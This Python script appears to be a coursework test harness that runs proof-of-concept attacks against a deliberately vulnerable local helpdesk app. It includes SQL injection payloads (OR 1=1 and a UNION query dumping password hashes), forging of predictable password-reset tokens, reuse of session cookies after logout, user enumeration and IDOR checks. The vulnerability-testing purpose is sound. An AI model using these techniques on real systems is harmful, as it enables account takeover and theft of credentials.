from __future__ import annotations

import base64
import http.cookiejar
import sqlite3
import sys
import time
import urllib.parse
import urllib.request
from urllib.error import HTTPError

BASE = "http://127.0.0.1:5000"
DB = r"C:/Anul 3/Semestru 2/Dezvoltarea Apl Softw/vulnerable/deskly_vuln.db"

def session_opener():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPRedirectHandler(),
    )
    return opener, cj

def post(opener, path, data):
    body = urllib.parse.urlencode(data).encode("utf-8")
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    return opener.open(req)

def get(opener, path):
    return opener.open(BASE + path)

def assert_(cond, msg):
    print(f"  {'PASS' if cond else 'FAIL'} -- {msg}")
    if not cond:
        sys.exit(1)

print("\n[4.1] weak password accepted on register")
opener, _ = session_opener()
email = f"weak_{int(time.time())}@x.local"
resp = post(opener, "/register", {"email": email, "password": "a", "confirm": "a"})
assert_(resp.status == 200, "register with single-char password reached the server")
db = sqlite3.connect(DB)
row = db.execute("SELECT email FROM users WHERE email = ?", (email,)).fetchone()
db.close()
assert_(row is not None, f"user {email} stored despite trivial password")

print("\n[4.2] passwords stored as plain MD5 hashes")
db = sqlite3.connect(DB)
hashes = db.execute("SELECT password_hash FROM users LIMIT 3").fetchall()
db.close()
import hashlib
md5_manager = hashlib.md5(b"Manager123!").hexdigest()
assert_(any(h[0] == md5_manager for h in hashes), "manager's MD5 hash present in DB")

print("\n[4.4] user enumeration via login error")
opener, _ = session_opener()
r1 = post(opener, "/login", {"email": "ghost@nope.local", "password": "x"}).read().decode()
r2 = post(opener, "/login", {"email": "manager@deskly.local", "password": "wrong"}).read().decode()
assert_("User does not exist" in r1, "unknown user => 'User does not exist'")
assert_("Incorrect password" in r2, "valid user => 'Incorrect password'")

print("\n[4.3] no rate limiting / lockout (10 wrong logins still allowed)")
opener, _ = session_opener()
for _ in range(10):
    post(opener, "/login", {"email": "manager@deskly.local", "password": "nope"})

opener2, cj2 = session_opener()
resp = post(opener2, "/login", {"email": "manager@deskly.local", "password": "Manager123!"})
cookies = [c.name for c in cj2]
assert_("session_id" in cookies, "login succeeded after 10 failed attempts (no lockout)")

print("\n[4.5] cookie has no HttpOnly/SameSite/Secure; session survives logout")
sid = next(c.value for c in cj2 if c.name == "session_id")

import urllib.request as urlreq
req = urlreq.Request(BASE + "/login", method="GET")
resp = urlreq.urlopen(req)

opener3, _ = session_opener()
body = urllib.parse.urlencode({"email": "manager@deskly.local", "password": "Manager123!"}).encode()
raw = urlreq.Request(BASE + "/login", data=body, method="POST")
class NoRedirect(urlreq.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None
op = urlreq.build_opener(NoRedirect)
try:
    resp = op.open(raw)
except HTTPError as e:
    resp = e
sc = resp.headers.get("Set-Cookie", "")
assert_("HttpOnly" not in sc, f"Set-Cookie has no HttpOnly: {sc[:80]}")
assert_("SameSite" not in sc, f"Set-Cookie has no SameSite: {sc[:80]}")
assert_("Secure" not in sc, f"Set-Cookie has no Secure: {sc[:80]}")

captured = sc.split("session_id=", 1)[1].split(";", 1)[0]

op2 = urllib.request.build_opener()
op2.open(BASE + "/logout")

req = urllib.request.Request(BASE + "/dashboard")
req.add_header("Cookie", f"session_id={captured}")
resp = urllib.request.urlopen(req)
body = resp.read().decode()
assert_("Dashboard" in body and "manager@deskly.local" in body,
        "captured cookie still authenticates after logout")

print("\n[4.6] reset token is predictable -- forge it without /forgot")
forged = base64.urlsafe_b64encode(b"1:0").decode().rstrip("=")
new_pw = "pwn3d-by-attacker"
opener, _ = session_opener()
post(opener, f"/reset/{forged}", {"password": new_pw, "confirm": new_pw})

opener2, cj2 = session_opener()
post(opener2, "/login", {"email": "manager@deskly.local", "password": new_pw})
assert_(any(c.name == "session_id" for c in cj2),
        "logged in as manager after resetting password via forged token")

opener, _ = session_opener()
forged2 = base64.urlsafe_b64encode(b"1:1").decode().rstrip("=")
post(opener, f"/reset/{forged2}", {"password": "Manager123!", "confirm": "Manager123!"})

print("\n[4.7] SQL injection on /ticket/search")
opener, _ = session_opener()
post(opener, "/login", {"email": "analyst@deskly.local", "password": "Analyst123!"})

resp = get(opener, "/ticket/search?q=" + urllib.parse.quote("' OR 1=1--"))
body = resp.read().decode()
assert_("Internal report" in body, "SQLi 'OR 1=1' leaked the manager's ticket")

union = ("' UNION SELECT id, email, password_hash, role, "
         "created_at, locked FROM users--")
resp = get(opener, "/ticket/search?q=" + urllib.parse.quote(union))
body = resp.read().decode()
assert_(md5_manager in body,
        "UNION attack exposed the manager's MD5 hash in the result table")

print("\n[4.8] IDOR -- analyst can read manager's ticket")
opener, _ = session_opener()
post(opener, "/login", {"email": "analyst@deskly.local", "password": "Analyst123!"})
resp = get(opener, "/ticket/1")
body = resp.read().decode()
assert_("Internal report" in body,
        "analyst fetched ticket #1 (owned by manager) without 403")

print("\n[4.9] no audit_logs rows")
db = sqlite3.connect(DB)
n = db.execute("SELECT COUNT(*) FROM audit_logs").fetchone()[0]
db.close()
assert_(n == 0, f"audit_logs is empty (got {n} rows)")

print("\nAll vulnerable PoCs reproduced.")
